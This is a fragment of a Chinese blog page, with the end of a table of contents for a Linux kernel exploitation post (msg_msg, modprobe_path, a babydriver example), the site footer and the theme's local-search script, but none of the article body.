          msg_msg介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#timerfd-ctx%E4%BB%8B%E7%BB%8D"><span class="toc-number">9.</span> <span class="toc-text">
          timerfd_ctx介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#modprobe-path"><span class="toc-number">10.</span> <span class="toc-text">
          modprobe_path</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">10.1.</span> <span class="toc-text">
          使用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babydriver%E5%88%A9%E7%94%A8%E7%A4%BA%E4%BE%8B-5"><span class="toc-number">10.2.</span> <span class="toc-text">
          babydriver利用示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%AA%E9%97%AE%E8%87%AA%E7%AD%94"><span class="toc-number">11.</span> <span class="toc-text">
          自问自答</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0%E4%B8%8B%E4%B8%80%E4%B8%AAkmalloc%E5%B0%86%E8%A2%AB%E5%88%86%E9%85%8D%E7%9A%84%E5%A0%86%E5%9D%97%E5%9C%B0%E5%9D%80%EF%BC%9F"><span class="toc-number">11.1.</span> <span class="toc-text">
          如何找到下一个kmalloc将被分配的堆块地址？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">12.</span> <span class="toc-text">
          参考</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">57</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">12</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">34</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="访问人数"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="浏览总量"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="99" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', '请输入字符');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>